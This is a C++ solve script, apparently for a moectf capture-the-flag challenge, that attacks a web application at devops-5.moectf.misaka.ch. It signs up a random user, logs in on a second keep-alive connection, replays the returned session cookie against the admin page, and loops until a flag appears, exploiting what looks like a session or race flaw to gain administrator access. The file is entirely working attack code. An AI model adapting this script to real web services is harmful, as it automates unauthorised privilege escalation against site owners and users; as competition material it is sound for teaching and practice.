#include"HTTPToolkit.h"
#include"Tube.h"
#include<ctime>
#include<string>
#include<iostream>
#include<cstdlib>
#include<regex>
using namespace std;
string flag_regex = "moectf\\{.+\\}";
string randstr() {
	srand(time(0)); string ret;
	int size = rand() % 21;
	for (int i = 0; i < size; i++)ret += rand() % 26 + 'a';
	return ret;
}

int HK_main() {
	string uname = randstr();
	string pwd = "asdfasdf";
	RemoteSession registerer = remote("devops-5.moectf.misaka.ch", 80);
	RemoteSession dae = remote("devops-5.moectf.misaka.ch", 80);
	POSTRequest *reg = new POSTRequest("devops-5.moectf.misaka.ch", "/?act=signup", "uname=" + uname + "&psw=" + pwd + "&psw-repeat=" + pwd);
	reg->table["Connection"] = "keep-alive";
	//cout << reg->toString();
	registerer.send(reg->toString());
	Sleep(10);
	//cout << registerer.recv();


	POSTRequest *login = new POSTRequest("devops-5.moectf.misaka.ch", "/?act=login", "uname=" + uname + "&psw=" + pwd + "&remember=on");
	login->table["Connection"] = "keep-alive";
	dae.send(login->toString());
	Sleep(100);

	GETRequest *admin = new GETRequest("devops-5.moectf.misaka.ch", "/?act=admin");
	HTTPResponse dd = parseResponse(dae.recv());
	admin->table["Cookie"] = dd.table["Set-Cookie"];
	dae.send(admin->toString());

	Sleep(1000);
	//cout << dae.recv() << endl;
	string temp = dae.recv();
	if (temp.find("moectf{") == -1)return HK_main();
	else {
		temp = temp.substr(temp.find("moectf"));
		temp = temp.substr(0, temp.find("}") + 1);
		cout << "flag got!:" << temp;
	}
	return 0;
}